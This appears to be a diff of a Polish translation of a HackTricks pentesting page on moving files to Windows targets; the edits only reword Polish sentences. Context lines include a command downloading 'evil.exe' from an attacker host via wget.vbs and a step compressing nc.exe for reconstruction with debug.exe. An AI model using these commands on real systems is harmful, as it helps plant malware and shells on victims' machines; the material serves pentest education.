@@ -247,7 +247,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Domyślnie w XP i 2003 (w innych musi być wyraźnie dodany podczas instalacji)
+Domyślnie w XP i 2003 (w innych musi być wyraźnie dodane podczas instalacji)
 
 W Kali, **uruchom serwer TFTP**:
 ```bash
@@ -309,7 +309,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` nie tylko umożliwia inspekcję plików binarnych, ale także ma **zdolność do odbudowywania ich z hex**. Oznacza to, że podając hex pliku binarnego, `debug.exe` może wygenerować plik binarny. Należy jednak zauważyć, że debug.exe ma **ograniczenie w zakresie składania plików do 64 kb**.
+Program `debug.exe` nie tylko umożliwia inspekcję plików binarnych, ale także ma **zdolność do ich odbudowy z hex**. Oznacza to, że podając hex pliku binarnego, `debug.exe` może wygenerować plik binarny. Należy jednak zauważyć, że debug.exe ma **ograniczenie w zakresie składania plików do 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -329,7 +329,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 <details>
 
-<summary>Wsparcie HackTricks</summary>
+<summary>Wsparcie dla HackTricks</summary>
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
